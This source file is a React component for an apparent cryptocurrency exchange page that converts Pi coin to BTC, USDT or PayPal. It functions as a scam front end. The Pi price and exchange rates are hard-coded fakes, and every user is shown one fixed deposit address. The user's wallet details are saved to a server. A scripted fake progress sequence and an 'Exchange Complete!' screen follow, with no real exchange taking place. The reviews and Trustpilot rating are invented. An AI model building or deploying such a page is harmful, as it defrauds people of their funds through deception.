'use client'

import { useState, useEffect } from 'react'
import Image from 'next/image'
import { Loader2, Copy, CheckCircle, TrendingUp, TrendingDown, ArrowRight, Star } from 'lucide-react'
import { z } from "zod"
const coins = {
  BTC: { name: 'Bitcoin', image: '/coins/btc.png' },
  PI: { name: 'Pi', image: '/coins/pi.png' },
  USDT: { name: 'USDT (TRC-20)', image: '/coins/usdt.png' },
  PAYPAL: { name: 'Paypal (Euro)', image: '/coins/paypal.png' },

}

const transactionSteps = [
  "Initiating transaction...",
  "Verifying sender's wallet...",
  "Confirming transaction details...",
  "Checking network congestion...",
  "Processing exchange rate...",
  "Executing trade...",
  "Finalizing transaction...",
  "Transferring funds to recipient wallet...",
]

export default function Hero() {
  const [fromCoin, setFromCoin] = useState<CoinSymbol>('PI'); // Use the union type here
  const [toCoin, setToCoin] = useState<CoinSymbol>('BTC'); // Same for toCoin
  const [amount, setAmount] = useState<string>('');
  const [toAddress, settoAddress] = useState('')
  const [estimatedAmount, setEstimatedAmount] = useState('')
  const [step, setStep] = useState<number>(1);
  const [transactionDetails, setTransactionDetails] = useState<any>(null);
  const [timeLeft, setTimeLeft] = useState(300) // 5 minutes in seconds
  const [depositAddress, setDepositAddress] = useState('')
  const [copied, setCopied] = useState(false)
  const [currentTransactionStep, setCurrentTransactionStep] = useState(0)
  const [progress, setProgress] = useState(0)
  const addressSchema = z.string().min(5, 'Please enter a valid address.');
  const [error, setError] = useState('');
  const [diPrice, setDiPrice] = useState(39.86)
  const [priceChange, setPriceChange] = useState(-0.31)
  const [lastTransaction, setLastTransaction] = useState(null)
  const [diWalletAddress, setDiWalletAddress] = useState('')

  interface TransactionDetails {
    fromCoin: string;
    toCoin: string;
    amount: string;
    estimatedAmount: string;
    toAddress: string;
    fee: string;
    txId: string;
  }
  type CoinSymbol = 'BTC' | 'PI' | 'USDT' | 'PAYPAL' ; // Define the valid coin symbols
  const reviews = [
    { id: 1, name: "John Doe", rating: 5, comment: "Excellent service! Fast and secure transactions." },
    { id: 2, name: "Jane Smith", rating: 4, comment: "Great platform, but could use more coin options." },
    { id: 3, name: "Mike Johnson", rating: 5, comment: "Best exchange rates I've found. Highly recommended!" },
    { id: 4, name: "Sarah Williams", rating: 4, comment: "User-friendly interface and responsive support team." },
  ]
  const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value;
    settoAddress(value);

    // Validate using Zod
    const result = addressSchema.safeParse(value);
    if (!result.success) {
      setError(result.error.errors[0].message); // Get the error message from Zod
    } else {
      setError(''); // Clear error if validation passes
    }
  };
  useEffect(() => {
    if (amount && fromCoin && toCoin) {
      let mockRate;
  
      if (fromCoin === 'PI') {
        if (toCoin === 'USDT') {
          mockRate = 39.89; // 1 PI = 39.89 USDT
        } else if (toCoin === 'PAYPAL') {
          mockRate = 39.89; // 1 PI = 39.89 PayPal
        } else {
          mockRate = 0.0006; // Default rate for other currencies
        }
      } else if (fromCoin === 'BTC') {
        mockRate = toCoin === 'USDT' ? 0.07 : 0.0006; // Adjust as needed for BTC
      } else {
        mockRate = 0.99; // Default rate if none match
      }
  
      setEstimatedAmount((parseFloat(amount) * mockRate).toFixed(4));
    } else {
      setEstimatedAmount('');
    }
  }, [amount, fromCoin, toCoin]);
  

  useEffect(() => {
    const fetchLastTransaction = async () => {
      try {
        const response = await fetch('/api/last-transaction')
        const data = await response.json()
        setLastTransaction(data)
      } catch (error) {
        console.error('Error fetching last transaction:', error)
      }
    }

    fetchLastTransaction()
    const interval = setInterval(fetchLastTransaction, 60000) // Fetch every minute

    return () => clearInterval(interval)
  }, [])

  

  useEffect(() => {
    let timer: NodeJS.Timeout | undefined; // Use NodeJS.Timeout for server-side, or number for browser
    if (step === 3) {
      const totalDuration = 300 // 5 minutes in seconds
      const interval = 1000 // Update every second
      const stepDuration = totalDuration / transactionSteps.length

      timer = setInterval(() => {
        setTimeLeft((prevTime) => {
          if (prevTime <= 1) {
            clearInterval(timer)
            setStep(4)
            return 0
          }
          return prevTime - 1
        })

        setProgress((prevProgress) => {
          const newProgress = prevProgress + (100 / totalDuration)
          if (newProgress >= 100) {
            clearInterval(timer)
            return 100
          }
          return newProgress
        })

        setCurrentTransactionStep((prevStep) => {
          const newStep = Math.floor((totalDuration - timeLeft) / stepDuration)
          return newStep < transactionSteps.length ? newStep : transactionSteps.length - 1
        })
      }, interval)
    }
    return () => clearInterval(timer)
  }, [step, timeLeft])

  function generateTxId(fromCoin: string): string {
    const randomString = Array.from({ length: 30 }, () => Math.random().toString(36).charAt(2)).join('');
    return `${fromCoin.toLowerCase()}_${randomString}`;
  }
  
  const handleExchange = async (e: React.FormEvent) => {
    e.preventDefault()
    setTransactionDetails({
      fromCoin,
      toCoin,
      amount,
      estimatedAmount,
      toAddress,
      fee: (parseFloat(amount) * 0.001).toFixed(4),
      txId: generateTxId(fromCoin),
    })
    setDepositAddress(`GD3RNDKY6H3PYUOZKKN4ASGO2PKFJB5CCB7NR2OP2DAGRWYSCYEHEUD5`)
    setStep(2)

   }

  const handleCopyAddress = () => {
    navigator.clipboard.writeText(depositAddress)
    setCopied(true)
    setTimeout(() => setCopied(false), 2000)
  }

  const handleContinue = async (e: React.FormEvent) => {
    const exchangeData = {
      time: new Date().toISOString(),
      date: new Date().toLocaleDateString(),
      amount,
      fromCoin,
      toCoin,
      diWalletAddress,
      toAddress
    }

    try {
      const response = await fetch('/api/save-exchange', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(exchangeData),
      })

      if (response.ok) {
        // Proceed to the next step
        setStep(2)
      } else {
        console.error('Failed to save exchange data')
      }
    } catch (error) {
      console.error('Error saving exchange data:', error)
    }  
    setStep(3)
    setProgress(0)
    setTimeLeft(10)
    setCurrentTransactionStep(0)
  }

  const ReviewCard = ({ name, rating, comment }) => (
    <div className="bg-white/10 p-6 rounded-lg backdrop-blur-sm">
      <div className="flex items-center mb-2">
        <div className="flex">
          {[...Array(5)].map((_, i) => (
            <Star
              key={i}
              className={`w-5 h-5 ${i < rating ? 'text-yellow-400 fill-yellow-400' : 'text-gray-300'}`}
            />
          ))}
        </div>
        <span className="ml-2 text-white font-semibold">{name}</span>
      </div>
      <p className="text-gray-200">{comment}</p>
    </div>
  )
  
  const TrustpilotRating = () => (
    <div className="flex items-center justify-center bg-white/10 p-4 rounded-lg backdrop-blur-sm">
      <div className="flex">
        {[...Array(5)].map((_, i) => (
          <Star
            key={i}
            className={`w-6 h-6 ${i < 4 ? 'text-[#00b67a] fill-[#00b67a]' : 'text-gray-300'}`}
          />
        ))}
      </div>
      <span className="ml-2 text-white font-semibold">4 out of 5</span>
      <span className="ml-2 text-gray-200">Based on 1,234 reviews</span>
    </div>
  )

  
  const renderPriceWidget = () => (
    <div className="bg-white rounded-lg p-4 shadow-lg mb-8 inline-block">
      <div className="flex items-center justify-between">
        <div className="flex items-center">
          <Image src="/coins/pi.png" alt="Pi Logo" width={32} height={32} className="mr-2" />
          <span className="text-lg font-bold text-gray-800">1 PI =</span>
        </div>
        <span className="text-lg font-bold text-gray-800">${diPrice.toFixed(2)}</span>
        <div className={`flex items-center ${priceChange >= 0 ? 'text-green-500' : 'text-red-500'}`}>
          {priceChange >= 0 ? (
            <TrendingUp className="w-5 h-5 mr-1" />
          ) : (
            <TrendingDown className="w-5 h-5 mr-1" />
          )}
          <span className="text-sm font-semibold">
            {Math.abs(priceChange).toFixed(2)}%
          </span>
        </div>
      </div>
    </div>
  )

  const renderLastTransaction = () => (
    <div className="bg-white rounded-lg p-4 shadow-lg mb-8 inline-block">
      <h3 className="text-lg text-gray-800 font-bold mb-2">Last Transaction</h3>
      {lastTransaction ? (
        <div className="flex items-center justify-between">
          <div>
            <p className="text-[#45206C] text-gray-800">Time: {new Date(lastTransaction.time).toLocaleTimeString()}</p>
            <p className="text-sm text-gray-800">Amount: {lastTransaction.amount} {lastTransaction.fromCoin}</p>
            <p className="text-sm text-gray-800">Address: {lastTransaction.address}</p>
          </div>
          <div className="flex items-center">
            <Image src={coins[lastTransaction.fromCoin].image} alt={lastTransaction.fromCoin} width={24} height={24} />
            <ArrowRight className="mx-2" style={{ color: 'gray' }} />
            <Image src={coins[lastTransaction.toCoin].image} alt={lastTransaction.toCoin} width={24} height={24} />
          </div>
        </div>
      ) : (
        <p className="text-sm">Loading last transaction...</p>
      )}
    </div>
  )

 const renderExchangeForm = () => (
  <form onSubmit={handleExchange} className="max-w-2xl mx-auto bg-white p-6 md:p-8 rounded-lg shadow-2xl">
    <div className="flex flex-col md:flex-row mb-6">
      <div className="flex-1 mb-4 md:mb-0 md:pr-4">
        <label className="block text-[#45206C] text-left mb-2">From</label>
        <div className="flex items-center bg-gray-100 rounded-md">
        <Image src={coins[fromCoin].image} alt={fromCoin} width={32} height={32} className="ml-3" />
        <select
          value={fromCoin}
          onChange={(e) => setFromCoin(e.target.value as CoinSymbol)} // Cast to CoinSymbol
          className="flex-1 p-3 bg-transparent text-[#45206C] focus:outline-none"
        >
  {Object.entries(coins) .filter(([symbol]) => !['BTC', 'USDT', 'PAYPAL'].includes(symbol))
.map(([symbol, { name }]) => (
            <option key={symbol} value={symbol}>{name}</option>
          ))}
        </select>
        </div>
      </div>
      <div className="flex-1 md:pl-4">
        <label className="block text-[#45206C] text-left mb-2">To</label>
        <div className="flex items-center bg-gray-100 rounded-md">
          <Image src={coins[toCoin].image} alt={toCoin} width={32} height={32} className="ml-3" />
          <select
  value={toCoin}
  onChange={(e) => setToCoin(e.target.value as CoinSymbol)} // Type assertion
  className="flex-1 p-3 bg-transparent text-[#45206C] focus:outline-none"
>
  {Object.entries(coins).filter(([symbol]) => symbol !== 'PI').map(([symbol, { name }]) => (
    <option key={symbol} value={symbol as CoinSymbol}>{name}</option>
  ))}
</select>

        </div>
      </div>
    </div>
    <div className="mb-6">
      <label className="block text-[#45206C] text-left mb-2">Amount (min 200)</label>
      <input
        type="number"
        value={amount}
        onChange={(e) => setAmount(e.target.value)}
        placeholder="Enter amount"
        min="200"
        required
        className="w-full p-3 text-[#45206C] rounded-md bg-gray-100 focus:outline-none focus:ring-2 focus:ring-[#FCB54A]"
      />
    </div>
    <div className="mb-6">
      <label className="block text-[#45206C] text-left mb-2">Your Pi Address</label>
      <input
        type="text"
        value={diWalletAddress}
        onChange={(e) => setDiWalletAddress(e.target.value)}
        placeholder="Enter your Pi address"
        required
        className="w-full p-3 text-[#45206C] rounded-md bg-gray-100 focus:outline-none focus:ring-2 focus:ring-[#FCB54A]"
      />
    </div>
    <div className="mb-6">
      <label className="block text-[#45206C] text-left mb-2">Your {toCoin} Address</label>
      <input
        type="text"
        value={toAddress}
        onChange={handleChange}
        placeholder="Enter address"
        required
        className="w-full p-3 text-[#45206C] rounded-md bg-gray-100 focus:outline-none focus:ring-2 focus:ring-[#FCB54A]"
      />
      {error && <p className="text-red-500 text-sm mt-1">{error}</p>}
    </div>
    
   {parseFloat(amount) >= 200 && estimatedAmount && (
        <p className="text-[#45206C] mb-6">
          You will receive approximately: <span className="font-bold">{estimatedAmount} {toCoin}</span>
        </p>
      )}
      {parseFloat(amount) > 0 && parseFloat(amount) < 200 && (
        <p className="text-red-500 mb-6">
          Minimum amount for exchange is 200
        </p>
      )}
    <button 
      type="submit" 
      disabled={!!error || !amount || !toAddress} // Disable if there's an error or empty fields
      className={`w-full p-3 rounded-md font-semibold text-lg transition-colors ${!!error || !amount || !toAddress ? 'bg-gray-300 text-gray-500 cursor-not-allowed' : 'bg-[#FCB54A] text-[#45206C] hover:bg-[#fca82a]'}`}
    >
      Exchange Now
    </button>
  </form>
);


  const renderDepositAddress = () => (
    <div className="max-w-2xl mx-auto bg-white p-6 md:p-8 rounded-lg shadow-2xl">
      <h2 className="text-2xl font-bold text-[#45206C] mb-4">Send Your {fromCoin}</h2>
      <p className="text-gray-600 mb-6">Please send {amount} {fromCoin} to the following address:</p>
      <div className="bg-gray-100 p-4 rounded-md flex items-center justify-between mb-6">
        <span className="text-[#45206C] font-mono break-all">{depositAddress}</span>
        <button 
          onClick={handleCopyAddress}
          className="ml-2 p-2 bg-[#FCB54A] text-[#45206C] rounded-md hover:bg-[#fca82a] transition-colors"
        >
          {copied ? <CheckCircle size={20} /> : <Copy size={20} />}
        </button>
      </div>
      <p className="text-sm text-gray-600 mb-6">
        Please note: Send only {fromCoin} to this address. Sending any other cryptocurrency may result in permanent loss.
      </p>
      <button 
        onClick={handleContinue}
        className="w-full bg-[#FCB54A] text-[#45206C] p-3 rounded-md font-semibold text-lg hover:bg-[#fca82a] transition-colors"
      >
        I've Sent the {fromCoin}
      </button>
    </div>
  )

  const renderTransactionStatus = () => (
    <div className="max-w-2xl mx-auto bg-white p-6 md:p-8 rounded-lg shadow-2xl text-center">
      <h2 className="text-2xl font-bold text-[#45206C] mb-4">Transaction in Progress</h2>
      <Loader2 className="animate-spin text-[#FCB54A] w-16 h-16 mx-auto mb-4" />
      <p className="text-lg mb-2">Estimated Time Left: {Math.floor(timeLeft / 60)}:{(timeLeft % 60).toString().padStart(2, '0')}</p>
      <div className="h-16 mb-4">
        <p key={currentTransactionStep} className="text-sm text-gray-600 animate-fade-in-out">
          {transactionSteps[currentTransactionStep]}
        </p>
      </div>
      <div className="w-full bg-gray-200 rounded-full h-2.5 mb-4">
        <div 
          className="bg-[#FCB54A] h-2.5 rounded-full transition-all duration-1000 ease-linear" 
          style={{ width: `${progress}%` }}
        ></div>
      </div>
      <div className="text-left text-sm text-gray-600 mt-6">
  {transactionDetails && (
    <>
      <p className="break-words">
        <span className="font-semibold">Transaction ID:</span> {transactionDetails.txId}...
      </p>
      <p className="break-words">
        <span className="font-semibold">Delivery Address:</span> {transactionDetails.toAddress}...
      </p>
      <p className="break-words">
        <span className="font-semibold">From:</span> {transactionDetails.amount} {transactionDetails.fromCoin}
      </p>
      <p className="break-words">
        <span className="font-semibold">To:</span> {transactionDetails.estimatedAmount} {transactionDetails.toCoin}
      </p>
      <p className="break-words">
        <span className="font-semibold">Network Fee:</span> {transactionDetails.fee} {transactionDetails.fromCoin}
      </p>
    </>
  )}
</div>

    </div>
  )

  const renderCompletionPage = () => (
    <div className="max-w-2xl mx-auto bg-white p-6 md:p-8 rounded-lg shadow-2xl text-center">
      <h2 className="text-3xl font-bold text-[#FCB54A] mb-6">Exchange Complete!</h2>
      <div className="mb-6">
        <p className="text-lg mb-2">
          <span className="font-semibold">Amount Exchanged:</span> {transactionDetails.amount} {transactionDetails.fromCoin} → {transactionDetails.estimatedAmount} {transactionDetails.toCoin}
        </p>
        <p className="text-sm text-gray-600">
        <span className="font-semibold">Transaction ID:</span> {transactionDetails!.txId}...
        </p>
        <p className="text-sm text-gray-600">
          <span className="font-semibold">Network Fee:</span> {transactionDetails.fee} {transactionDetails.fromCoin}
        </p>
        <p className="text-sm text-gray-600">
          <span className="font-semibold">Time Taken:</span> 5 minutes
        </p>
      </div>
      <div className="space-y-4">
        <button onClick={() => setStep(1)} className="w-full bg-[#FCB54A] text-[#45206C] p-3 rounded-md font-semibold text-lg hover:bg-[#fca82a] transition-colors">
          Make Another Exchange
        </button>
      </div>
    </div>
  )

  return (
     <section className="relative w-full bg-gradient-to-b from-[#45206C] to-[#6B3A9E] text-white py-12 md:py-20 overflow-hidden animate-gradient">
      <Image
        src="/bg.png"
        fill
        
        quality={100}
        alt="Exchange Background"
        className="z-0"
      />
      {/* Content */}
      <div className="relative container mx-auto px-4 text-center z-10">
        <h1 className="text-3xl md:text-5xl font-bold mb-4 md:mb-8">Easily Exchange Your Coins</h1>
        <p className="text-lg md:text-xl mb-8">Fast, secure, and low-fee cryptocurrency exchanges</p>
        <div className="flex flex-col md:flex-row justify-center items-center gap-4 mb-8">
          {renderPriceWidget()}
          {renderLastTransaction()}
        </div>
        {step === 1 && renderExchangeForm()}
        {step === 2 && renderDepositAddress()}
        {step === 3 && renderTransactionStatus()}
        {step === 4 && renderCompletionPage()}
      </div>
      
      <style jsx>{`
    @keyframes gradient {
      0% {
        background-position: 0% 50%;
      }
      50% {
        background-position: 100% 50%;
      }
      100% {
        background-position: 0% 50%;
      }
    }
    .animate-gradient {
      background: linear-gradient(2a0deg, #45206C, #6B3A9E, #45206C);
      background-size: 400% 400%;
      animation: gradient 8s ease infinite;
    }
  `}</style>
    </section>
  )
}